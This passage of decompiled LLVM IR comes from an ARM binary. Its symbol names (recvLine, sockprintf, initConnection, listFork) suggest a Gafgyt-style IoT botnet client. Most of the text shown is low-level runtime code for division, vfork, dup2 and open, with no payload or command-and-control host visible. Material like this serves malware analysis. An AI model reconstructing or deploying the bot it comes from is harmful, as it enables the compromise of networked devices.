  %v2_1192c = load i32, i32* @global_var_28570.50, align 4
  %v5_11948 = call i32 @recvLine(i32 %v2_1192c, i8* %v4_11948, i32 4096, i32 %v2_11938)
  %v3_11958 = icmp eq i32 %v5_11948, -1
  br i1 %v3_11958, label %dec_label_pc_110a8.outer, label %dec_label_pc_11374

; uselistorder directives
  uselistorder i32 %v5_11948, { 1, 0 }
  uselistorder i32 %storemerge15128, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_1189c, { 1, 0 }
  uselistorder i8* %stack_var_-36.049, { 2, 1, 0 }
  uselistorder i32 %stack_var_-40.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_11658, { 1, 0 }
  uselistorder i8* %storemerge743, { 1, 0 }
  uselistorder i32 %v1_11620, { 1, 2, 0 }
  uselistorder i32 %v1_1158c, { 2, 1, 0 }
  uselistorder i8* %v5_1155c, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_11558, { 3, 0, 2, 1, 4 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_11490, { 1, 2, 0 }
  uselistorder i1 %v9_113a8, { 1, 0 }
  uselistorder i32 %v3_113bc, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_112f4, { 1, 0 }
  uselistorder i32 %v3_11328, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1129c, { 1, 0 }
  uselistorder i32 %v1_11280, { 1, 0 }
  uselistorder i32 %v5_111bc, { 1, 0 }
  uselistorder i32 %v1_11150, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_1116c, { 1, 0 }
  uselistorder i32 %v2_11160, { 1, 0 }
  uselistorder i32 %v2_116a4, { 2, 4, 3, 5, 1, 0 }
  uselistorder i8* %v4_11948, { 3, 0, 1, 2 }
  uselistorder i32 %v2_11938, { 7, 0, 3, 4, 5, 6, 1, 2 }
  uselistorder i32 %v2_11020, { 1, 0 }
  uselistorder i32 %v0_11008, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10fbc, { 1, 0, 2 }
  uselistorder i32 %v2_10f20, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 0, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @listFork, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_28578.68, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_2e7d8.71, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 (i32, i32)* @sockprintf, { 28, 27, 26, 25, 24, 23, 22, 21, 9, 8, 7, 6, 5, 4, 3, 2, 1, 20, 19, 18, 17, 16, 10, 15, 14, 13, 12, 11, 29, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_2e7cc.314, { 1, 0, 8, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* @global_var_28570.50, { 2, 3, 4, 5, 0, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32)* @sleep, { 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 -600, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 2, 1, 4, 3, 0 }
  uselistorder [2 x i8]* @global_var_26438.947, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_26438.947 to i32), { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 22, 23, 13, 14, 15, 16, 17, 18, 19, 0, 1, 2, 3, 4, 5, 6, 20, 21 }
  uselistorder i32 ptrtoint (i32* @global_var_26420.943 to i32), { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11928.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_118e4, { 1, 0 }
  uselistorder label %dec_label_pc_11894, { 1, 0 }
  uselistorder label %dec_label_pc_117c0, { 1, 0 }
  uselistorder label %dec_label_pc_11794, { 1, 0 }
  uselistorder label %dec_label_pc_1175c, { 1, 0 }
  uselistorder label %dec_label_pc_11634, { 1, 0 }
  uselistorder label %dec_label_pc_11610, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11600, { 1, 0 }
  uselistorder label %dec_label_pc_11588, { 1, 0 }
  uselistorder label %dec_label_pc_114f4, { 1, 0 }
  uselistorder label %dec_label_pc_114b8, { 1, 0 }
  uselistorder label %dec_label_pc_113e0, { 1, 0 }
  uselistorder label %dec_label_pc_11368, { 1, 0 }
  uselistorder label %dec_label_pc_112d8, { 1, 0 }
  uselistorder label %dec_label_pc_111a0, { 1, 0 }
  uselistorder label %dec_label_pc_110b8, { 1, 0 }
  uselistorder label %dec_label_pc_110a8.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11090, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11004, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10edc, { 1, 0 }
  uselistorder label %dec_label_pc_10e68, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_119b8 = load i32, i32* @r1, align 4
  %v1_119b8 = add i32 %v0_119b8, -1
  store i32 %v1_119b8, i32* %r2.global-to-local, align 4
  %v2_119b8 = icmp eq i32 %v0_119b8, 0
  %v7_119b8 = icmp eq i32 %v0_119b8, 1
  %v0_119bc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_119b8, i32 %v0_119bc)
  br i1 %v2_119b8, label %dec_label_pc_11aa0, label %dec_label_pc_119c4

dec_label_pc_119c4:                               ; preds = %entry
  %v0_119c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_119c4 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_119c4, %v1_119c4
  br i1 %tmp, label %dec_label_pc_119cc, label %dec_label_pc_11a58

dec_label_pc_119cc:                               ; preds = %dec_label_pc_119c4
  %v1_119cc = load i32, i32* %r2.global-to-local, align 4
  %v2_119cc = and i32 %v1_119cc, %v1_119c4
  %v4_119cc = icmp eq i32 %v2_119cc, 0
  br i1 %v4_119cc, label %dec_label_pc_11a64, label %dec_label_pc_119d4

dec_label_pc_119d4:                               ; preds = %dec_label_pc_119cc
  %v3_119d4 = icmp ult i32 %v1_119c4, 536870912
  br i1 %v3_119d4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_119d4
  %v4_119d8 = mul i32 %v1_119c4, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_119d4, %.thread
  %v0_119f8.pr36.ph = phi i32 [ %v4_119d8, %.thread ], [ %v1_119c4, %dec_label_pc_119d4 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_119d4 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_119f8.pr36 = phi i32 [ %v4_119ec, %bb81 ], [ %v0_119f8.pr36.ph, %.preheader.preheader ]
  %v1_119f0 = phi i32 [ %v4_119f0, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_119e4 = icmp ugt i32 %v0_119f8.pr36, 268435455
  br i1 %v2_119e4, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_119f8thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_119e8 = icmp ult i32 %v0_119f8.pr36, %v0_119c4
  br i1 %v4_119e8, label %bb80, label %dec_label_pc_119f8thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_119ec = and i32 %v0_119f8.pr36, 268435456
  %v3_119ec = icmp eq i32 %v2_119ec, 0
  %v4_119ec = mul i32 %v0_119f8.pr36, 16
  br i1 %v3_119ec, label %bb81, label %dec_label_pc_119f8.loopexit

bb81:                                             ; preds = %bb80
  %v2_119f0 = and i32 %v1_119f0, 268435456
  %v3_119f0 = icmp eq i32 %v2_119f0, 0
  %v4_119f0 = mul i32 %v1_119f0, 16
  br i1 %v3_119f0, label %.preheader, label %dec_label_pc_119f8thread-pre-split.loopexit.loopexit

dec_label_pc_119f8thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_11a0448.ph = phi i32 [ %v1_119f0, %bb ], [ %v4_119f0, %bb81 ]
  %v0_119f8.pr38.ph = phi i32 [ %v0_119f8.pr36, %bb ], [ %v4_119ec, %bb81 ]
  br label %dec_label_pc_119f8thread-pre-split.loopexit

dec_label_pc_119f8thread-pre-split.loopexit:      ; preds = %dec_label_pc_119f8thread-pre-split.loopexit.loopexit, %.thread2
  %v1_11a0448 = phi i32 [ %v1_119f0, %.thread2 ], [ %v1_11a0448.ph, %dec_label_pc_119f8thread-pre-split.loopexit.loopexit ]
  %v0_119f8.pr38 = phi i32 [ %v0_119f8.pr36, %.thread2 ], [ %v0_119f8.pr38.ph, %dec_label_pc_119f8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_119f8thread-pre-split

dec_label_pc_119f8thread-pre-split:               ; preds = %dec_label_pc_119f8thread-pre-split.loopexit, %bb83
  %v1_11a0446 = phi i32 [ %v1_11a0448, %dec_label_pc_119f8thread-pre-split.loopexit ], [ %v3_11a04, %bb83 ]
  %v0_119f8.pr = phi i32 [ %v0_119f8.pr38, %dec_label_pc_119f8thread-pre-split.loopexit ], [ %v3_11a00, %bb83 ]
  br label %dec_label_pc_119f8

dec_label_pc_119f8.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_119f8

dec_label_pc_119f8:                               ; preds = %dec_label_pc_119f8.loopexit, %dec_label_pc_119f8thread-pre-split
  %v1_11a04 = phi i32 [ %v1_11a0446, %dec_label_pc_119f8thread-pre-split ], [ %v1_119f0, %dec_label_pc_119f8.loopexit ]
  %v1_11a00 = phi i32 [ %v0_119f8.pr, %dec_label_pc_119f8thread-pre-split ], [ %v4_119ec, %dec_label_pc_119f8.loopexit ]
  %v2_119f8 = icmp slt i32 %v1_11a00, 0
  br i1 %v2_119f8, label %dec_label_pc_11a0c, label %bb82

bb82:                                             ; preds = %dec_label_pc_119f8
  %v4_119fc = icmp ult i32 %v1_11a00, %v0_119c4
  br i1 %v4_119fc, label %bb83, label %dec_label_pc_11a0c

bb83:                                             ; preds = %bb82
  %v3_11a00 = mul i32 %v1_11a00, 2
  %v2_11a04 = icmp slt i32 %v1_11a04, 0
  %v3_11a04 = mul i32 %v1_11a04, 2
  br i1 %v2_11a04, label %dec_label_pc_11a0c, label %dec_label_pc_119f8thread-pre-split

dec_label_pc_11a0c:                               ; preds = %bb82, %dec_label_pc_119f8, %bb83
  %v2_11a1859 = phi i32 [ %v3_11a04, %bb83 ], [ %v1_11a04, %bb82 ], [ %v1_11a04, %dec_label_pc_119f8 ]
  %v1_11a1051 = phi i32 [ %v3_11a00, %bb83 ], [ %v1_11a00, %bb82 ], [ %v1_11a00, %dec_label_pc_119f8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11a10

dec_label_pc_11a10:                               ; preds = %.thread11, %dec_label_pc_11a0c
  %v1_11a44 = phi i32 [ %v4_11a44, %.thread11 ], [ %v2_11a1859, %dec_label_pc_11a0c ]
  %v1_11a18 = phi i32 [ %v0_11a50, %.thread11 ], [ 0, %dec_label_pc_11a0c ]
  %v1_11a48 = phi i32 [ %v4_11a48, %.thread11 ], [ %v1_11a1051, %dec_label_pc_11a0c ]
  %v1_11a14 = phi i32 [ %v0_11a40, %.thread11 ], [ %v0_119c4, %dec_label_pc_11a0c ]
  %v3_11a10 = icmp ult i32 %v1_11a14, %v1_11a48
  br i1 %v3_11a10, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_11a10
  %v3_11a14 = sub i32 %v1_11a14, %v1_11a48
  store i32 %v3_11a14, i32* %r0.global-to-local, align 4
  %v3_11a18 = or i32 %v1_11a18, %v1_11a44
  store i32 %v3_11a18, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11a10, %bb84
  %v1_11a20 = phi i32 [ %v1_11a14, %dec_label_pc_11a10 ], [ %v3_11a14, %bb84 ]
  %v1_11a24 = phi i32 [ %v1_11a18, %dec_label_pc_11a10 ], [ %v3_11a18, %bb84 ]
  %v4_11a1c = udiv i32 %v1_11a48, 2
  %v6_11a1c = icmp ult i32 %v1_11a20, %v4_11a1c
  br i1 %v6_11a1c, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_11a20 = urem i32 %v1_11a48, 2
  %v4_11a20 = icmp eq i32 %v3_11a20, 0
  %v6_11a20 = sub i32 %v1_11a20, %v4_11a1c
  store i32 %v6_11a20, i32* %r0.global-to-local, align 4
  br i1 %v4_11a20, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_11a24 = udiv i32 %v1_11a44, 2
  %v6_11a24 = or i32 %v1_11a24, %v5_11a24
  store i32 %v6_11a24, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_11a2c = phi i32 [ %v6_11a20, %bb85 ], [ %v1_11a20, %.thread7 ], [ %v6_11a20, %bb86 ]
  %v1_11a30 = phi i32 [ %v1_11a24, %bb85 ], [ %v1_11a24, %.thread7 ], [ %v6_11a24, %bb86 ]
  %v4_11a28 = udiv i32 %v1_11a48, 4
  %v6_11a28 = icmp ult i32 %v1_11a2c, %v4_11a28
  br i1 %v6_11a28, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_11a2c = and i32 %v1_11a48, 2
  %v4_11a2c = icmp eq i32 %v3_11a2c, 0
  %v6_11a2c = sub i32 %v1_11a2c, %v4_11a28
  store i32 %v6_11a2c, i32* %r0.global-to-local, align 4
  br i1 %v4_11a2c, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_11a30 = udiv i32 %v1_11a44, 4
  %v6_11a30 = or i32 %v1_11a30, %v5_11a30
  store i32 %v6_11a30, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_11a38 = phi i32 [ %v6_11a2c, %bb87 ], [ %v1_11a2c, %.thread8 ], [ %v6_11a2c, %bb88 ]
  %v1_11a3c = phi i32 [ %v1_11a30, %bb87 ], [ %v1_11a30, %.thread8 ], [ %v6_11a30, %bb88 ]
  %v4_11a34 = udiv i32 %v1_11a48, 8
  %v6_11a34 = icmp ult i32 %v1_11a38, %v4_11a34
  br i1 %v6_11a34, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_11a38 = and i32 %v1_11a48, 4
  %v4_11a38 = icmp eq i32 %v3_11a38, 0
  %v6_11a38 = sub i32 %v1_11a38, %v4_11a34
  store i32 %v6_11a38, i32* %r0.global-to-local, align 4
  br i1 %v4_11a38, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_11a3c = udiv i32 %v1_11a44, 8
  %v6_11a3c = or i32 %v1_11a3c, %v5_11a3c
  store i32 %v6_11a3c, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_11a50 = phi i32 [ %v1_11a3c, %bb89 ], [ %v1_11a3c, %.thread9 ], [ %v6_11a3c, %bb90 ]
  %v0_11a40 = phi i32 [ %v6_11a38, %bb89 ], [ %v1_11a38, %.thread9 ], [ %v6_11a38, %bb90 ]
  %v2_11a40 = icmp eq i32 %v0_11a40, 0
  br i1 %v2_11a40, label %dec_label_pc_11a50, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_11a44, 16
  br i1 %tmp138, label %dec_label_pc_11a50, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_11a44 = udiv i32 %v1_11a44, 16
  %v4_11a48 = udiv i32 %v1_11a48, 16
  br label %dec_label_pc_11a10

dec_label_pc_11a50:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_11a50, i32* %r0.global-to-local, align 4
  ret i32 %v0_11a50

dec_label_pc_11a58:                               ; preds = %dec_label_pc_119c4
  %v9_119c4 = icmp eq i32 %v0_119c4, %v1_119c4
  %. = zext i1 %v9_119c4 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_11a64:                               ; preds = %dec_label_pc_119cc
  %v2_11a64 = icmp ugt i32 %v1_119c4, 65535
  br i1 %v2_11a64, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_11a64
  %v2_11a68 = and i32 %v1_119c4, 32768
  %v3_11a68 = icmp eq i32 %v2_11a68, 0
  %v4_11a68 = udiv i32 %v1_119c4, 65536
  br i1 %v3_11a68, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_11a64
  %v0_11a7465 = phi i32 [ %v1_119c4, %dec_label_pc_11a64 ], [ %v4_11a68, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_11a78 = phi i32 [ %v0_11a7465, %.thread16 ], [ %v4_11a68, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_11a74 = icmp ugt i32 %v1_11a78, 255
  br i1 %v2_11a74, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_11a78 = and i32 %v1_11a78, 128
  %v3_11a78 = icmp eq i32 %v2_11a78, 0
  %v4_11a78 = udiv i32 %v1_11a78, 256
  br i1 %v3_11a78, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_11a7c = or i32 %storemerge, 8
  store i32 %v2_11a7c, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_11a88 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_11a7c, %bb98 ]
  %v1_11a84 = phi i32 [ %v1_11a78, %bb96 ], [ %v4_11a78, %bb97 ], [ %v4_11a78, %bb98 ]
  %v2_11a80 = icmp ugt i32 %v1_11a84, 15
  br i1 %v2_11a80, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_11a84 = and i32 %v1_11a84, 8
  %v3_11a84 = icmp eq i32 %v2_11a84, 0
  %v4_11a84 = udiv i32 %v1_11a84, 16
  br i1 %v3_11a84, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_11a88 = add nsw i32 %v1_11a88, 4
  store i32 %v2_11a88, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_11a90 = phi i32 [ %v1_11a88, %.thread17 ], [ %v1_11a88, %bb99 ], [ %v2_11a88, %bb100 ]
  %v5_11a94 = phi i32 [ %v1_11a84, %.thread17 ], [ %v4_11a84, %bb99 ], [ %v4_11a84, %bb100 ]
  %v2_11a8c = icmp ugt i32 %v5_11a94, 3
  %v7_11a8c = icmp eq i32 %v5_11a94, 4
  %v2_11a90 = xor i1 %v7_11a8c, true
  %v3_11a90 = and i1 %v2_11a8c, %v2_11a90
  br i1 %v3_11a90, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_11a90 = add nsw i32 %v4_11a90, 3
  store i32 %v5_11a90, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_11a94 = phi i32 [ %v4_11a90, %.thread18 ], [ %v5_11a90, %bb101 ]
  %v2_11a94 = xor i1 %v2_11a8c, true
  %v3_11a94 = or i1 %v7_11a8c, %v2_11a94
  br i1 %v3_11a94, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_11a94 = udiv i32 %v5_11a94, 2
  %v9_11a94 = add i32 %v4_11a94, %v8_11a94
  store i32 %v9_11a94, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_11a98 = phi i32 [ %v4_11a94, %bb102 ], [ %v9_11a94, %bb103 ]
  %v6_11a98 = lshr i32 %v0_119c4, %v1_11a98
  store i32 %v6_11a98, i32* %r0.global-to-local, align 4
  ret i32 %v6_11a98

dec_label_pc_11aa0:                               ; preds = %entry
  %v0_11aa4 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_11a94, { 1, 0 }
  uselistorder i1 %v7_11a8c, { 1, 0 }
  uselistorder i32 %v4_11a84, { 1, 0 }
  uselistorder i32 %v1_11a84, { 1, 0, 2, 3 }
  uselistorder i32 %v2_11a7c, { 1, 0 }
  uselistorder i32 %v4_11a78, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11a78, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11a68, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_11a40, { 1, 0 }
  uselistorder i32 %v0_11a50, { 1, 0, 2 }
  uselistorder i32 %v4_11a34, { 1, 0 }
  uselistorder i32 %v1_11a3c, { 1, 2, 0 }
  uselistorder i32 %v4_11a28, { 1, 0 }
  uselistorder i32 %v1_11a30, { 1, 2, 0 }
  uselistorder i32 %v4_11a1c, { 1, 0 }
  uselistorder i32 %v1_11a24, { 1, 2, 0 }
  uselistorder i32 %v1_11a48, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_11a18, { 1, 0 }
  uselistorder i32 %v1_11a44, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_11a04, { 1, 0 }
  uselistorder i32 %v3_11a00, { 1, 0 }
  uselistorder i32 %v1_11a00, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_11a04, { 1, 2, 0, 3 }
  uselistorder i32 %v4_119f0, { 1, 0 }
  uselistorder i32 %v4_119ec, { 2, 1, 0 }
  uselistorder i32 %v1_119f0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_119f8.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_119c4, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_119c4, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_119b8, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_11a50, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_11a0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_119f8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_11ab8 = udiv i32 %arg1, %arg2
  ret i32 %v2_11ab8
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_11ad4 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_11ad4
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_11ae0 = load i32, i32* @r7, align 4
  store i32 %v0_11ae0, i32* @ip, align 4
  %v0_11af0 = load i32, i32* @r0, align 4
  %v2_11af0 = icmp ugt i32 %v0_11af0, -4097
  br i1 %v2_11af0, label %bb1, label %bb

bb:                                               ; preds = %entry
  ret i32 %v0_11af0

bb1:                                              ; preds = %entry
  %v4_11afc = icmp eq i32 %v0_11af0, -38
  br i1 %v4_11afc, label %dec_label_pc_11b04, label %bb2

dec_label_pc_11b04:                               ; preds = %bb1
  store i32 %v0_11ae0, i32* @ip, align 4
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_11b04, %bb1
  %v0_11b1c = call i32 @__syscall_error()
  ret i32 %v0_11b1c
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11b20 = load i32, i32* @r7, align 4
  store i32 %v3_11b20, i32* %stack_var_-8, align 4
  %v0_11b2c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11b2c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11b2c, -4095
  br i1 %tmp, label %dec_label_pc_11b4c, label %dec_label_pc_11b3c

dec_label_pc_11b3c:                               ; preds = %entry
  %v0_11b3c = call i32 @__GI___errno_location()
  %v0_11b40 = load i32, i32* %r7.global-to-local, align 4
  %v1_11b40 = sub i32 0, %v0_11b40
  %v2_11b44 = inttoptr i32 %v0_11b3c to i32*
  store i32 %v1_11b40, i32* %v2_11b44, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11b4c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11b4c

dec_label_pc_11b4c:                               ; preds = %entry, %dec_label_pc_11b3c
  %v1_11b50 = phi i32 [ %v0_11b2c, %entry ], [ -1, %dec_label_pc_11b3c ]
  %v2_11b4c = phi i32 [ %v3_11b20, %entry ], [ %v2_11b4c.pre, %dec_label_pc_11b3c ]
  store i32 %v2_11b4c, i32* @r7, align 4
  ret i32 %v1_11b50

; uselistorder directives
  uselistorder i32 %v0_11b2c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11b4c, { 1, 0 }
}

define i32 @__GI_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_11b54 = load i32, i32* @r2, align 4
  %v9_11b54 = load i32, i32* @r3, align 4
  store i32 %v9_11b54, i32* %stack_var_-4, align 4
  %v1_11b64 = and i32 %arg2, 64
  %v2_11b64 = icmp eq i32 %v1_11b64, 0
  br i1 %v2_11b64, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v3_11b6c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_11b6c, i32* @r3, align 4
  %phitmp = urem i32 %v6_11b54, 65536
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v0_11b70 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_11b70, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11ba0, label %dec_label_pc_11b90

dec_label_pc_11b90:                               ; preds = %.thread
  %v0_11b90 = call i32 @__GI___errno_location()
  %v0_11b94 = load i32, i32* %r7.global-to-local, align 4
  %v1_11b94 = sub i32 0, %v0_11b94
  store i32 %v1_11b94, i32* @r3, align 4
  %v2_11b98 = inttoptr i32 %v0_11b90 to i32*
  store i32 %v1_11b94, i32* %v2_11b98, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11ba0

dec_label_pc_11ba0:                               ; preds = %.thread, %dec_label_pc_11b90
  %v0_11ba0 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_11b90 ]
  ret i32 %v0_11ba0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
